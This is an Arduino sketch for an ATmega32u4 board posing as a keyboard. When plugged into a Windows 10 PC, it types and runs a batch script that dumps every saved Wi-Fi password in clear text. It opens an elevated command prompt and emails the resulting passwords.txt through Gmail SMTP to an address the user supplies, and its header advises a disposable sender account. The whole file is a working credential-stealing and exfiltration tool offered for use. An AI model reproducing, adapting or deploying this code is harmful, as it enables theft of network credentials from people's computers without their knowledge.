/* 
 * Author: Morteza Shoeibi <mortezashoeibi77@gmail.com>
 * File: main.ino
 * Description:
        This is an "Arduino ATmega32u4" board program.
        It gets the system Wi-Fi profiles passwords and
        Email them to the specified email address.
 * Note: 
        This script works only on win10. 
        Before  using this script , make
        Sure to change these three lines
        --------------------------------
 *      152:
            use a disposable email address  here  and
            place it instead of sender@gmail.com, its
            password shall be placed instead of senderpass.
 *      156:
            put the disposable mail address you added
            on line 152 here again.
 *      158:
            your actual email address to receive  the
            passwords.
*/


#include <Keyboard.h>

#define RELEASE_KEYS 100 // milliseconds

// press and release a key
void press1key(int _key) {
    Keyboard.press(_key);
    delay(RELEASE_KEYS);
    Keyboard.release(_key);
}

// press and release two keys
void press2keys(int _1key, int _2key) {
    Keyboard.press(_1key);
    Keyboard.press(_2key);
    delay(RELEASE_KEYS);
    Keyboard.releaseAll();
}



// main functions

// init function
void setup() {
    // initialize control over the keyboard
    Keyboard.begin();
}

// script function
void loop() {
    delay(5000);
    // open run
    press2keys(KEY_LEFT_GUL, 'r');
    delay(500);
    // open notepad
    Keyboard.println("notepad.exe");
    delay(1500);
    // type a script in the opend notepad window
    /* script start */
    Keyboard.println("setlocal enabledelayedexpansion");
    Keyboard.println(":main");
    Keyboard.println("\t:: Get all the profiles");
    Keyboard.println("\tcall :get-profiles r");
    Keyboard.println("\t:: For each profile, try to get the password");
    Keyboard.println("\t:main-next-profile");
    Keyboard.println("\t\tfor /f \"tokens=1* delims=,\" %%a in (\"%r%\") do (");
    Keyboard.println("\t\t\tcall :get-profile-key \"%%a\" key");
    Keyboard.println("\t\t\tif \"!key!\" NEQ \"\" (");
    Keyboard.println("\t\t\t\techo WiFi: [%%a] Password: [!key!] >> passwords.txt");
    Keyboard.println("\t\t\t)");
    Keyboard.println("\t\t\tset r=%%b");
    Keyboard.println("\t\t)");
    Keyboard.println("\t\tif \"%r%\" NEQ \"\" goto main-next-profile");
    Keyboard.println("\techo.");
    Keyboard.println("\tpause");
    Keyboard.println("\tgoto :eof");
    Keyboard.println("::");
    Keyboard.println(":: Get the WiFi key of a given profile");
    Keyboard.println(":get-profile-key <1=profile-name> <2=out-profile-key>");
    Keyboard.println("\tsetlocal");
    Keyboard.println("\tset result=");
    Keyboard.println("\tFOR /F \"usebackq tokens=2 delims=:\" %%a in (");
    Keyboard.println("\t\t`netsh wlan show profile name^=\"%~1\" key^=clear ^| findstr /C:\"Key Content\"`) DO (");
    Keyboard.println("\t\tset result=%%a");
    Keyboard.println("\t\tset result=!result:~1!");
    Keyboard.println("\t)");
    Keyboard.println("\t(");
    Keyboard.println("\t\tendlocal");
    Keyboard.println("\t\tset %2=%result%");
    Keyboard.println("\t)");
    Keyboard.println("\tgoto :eof");
    Keyboard.println("::");
    Keyboard.println(":: Get all network profiles (comma separated) into the result result-variable");
    Keyboard.println(":get-profiles <1=result-variable>");
    Keyboard.println("\tsetlocal");
    Keyboard.println("\tset result=");
    Keyboard.println("\tFOR /F \"usebackq tokens=2 delims=:\" %%a in (");
    Keyboard.println("\t\t`netsh wlan show profiles ^| findstr /C:\"All User Profile\"`) DO (");
    Keyboard.println("\t\tset val=%%a");
    Keyboard.println("\t\tset val=!val:~1!");
    Keyboard.println("\t\tset result=%!val!,!result!");
    Keyboard.println("\t)");
    Keyboard.println("\t(");
    Keyboard.println("\t\tendlocal");
    Keyboard.println("set %1=%result:~0,-1%");
    Keyboard.println("\t)");
    Keyboard.println("\tgoto :eof");
    /* script end */
    delay(500)
    // save script
    press2keys(KEY_LEFT_CTRL, 's');
    delay(1000);
    Keyboard.println("%appdata%\\getwifispass.bat")
    delay(1000);
    // close window
    press2keys(KEY_LEFT_ALT, KEY_F4);
    delay(1000);
    // open run
    press2keys(KEY_LEFT_GUL, 'r');
    delay(500);
    // open cmd as admin
    Keyboard.print("cmd");
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_SHIFT);
    Keyboard.press(KEY_RETURN);
    delay(1000);
    press2keys(KEY_LEFT_ARROW, KEY_RETURN);
    delay(1000);
    // run the .bat fle
    Keyboard.println("cd %appdata%");
    Keyboard.println("getwifispass.bat");
    delay(5000);
    Keyboard.press(KEY_RETURN);
    delay(RELEASE_KEYS);
    Keyboard.release(KEY_RETURN);
    // run powershell in cmd
    Keyboard.println("powershell");
    delay(1000);
    // send passwords list file by email
    Keyboard.println("$SMTPServer = 'smtp.gmail.com'");
    delay(100)
    Keyboard.println("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
    delay(100)
    Keyboard.println("$SMTPInfo.EnableSsl = $true");
    delay(100)
    Keyboard.println("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('sender@gmail.com', 'senderpass');");
    delay(100)
    Keyboard.println("$ReportEmail = New-Object System.Net.Mail.MailMessage");
    delay(100)
    Keyboard.println("$ReportEmail.From = 'sender@gmail.com'");
    delay(100)
    Keyboard.println("$ReportEmail.To.Add('reciever@gmail.com')");
    delay(100)
    Keyboard.println("$ReportEmail.Body = 'Wi-fi Passwords:'");
    delay(100)
    Keyboard.println("$ReportEmail.Attachments.Add('passwords.txt')");
    delay(100);
    Keyboard.println("$SMTPInfo.Send($ReportEmail)");
    delay(2000);
    // exit cmd
    Keyboard.println("exit");
    delay(5000);
    press2keys(KEY_LEFT_ALT, KEY_F4);

    while(1);
}
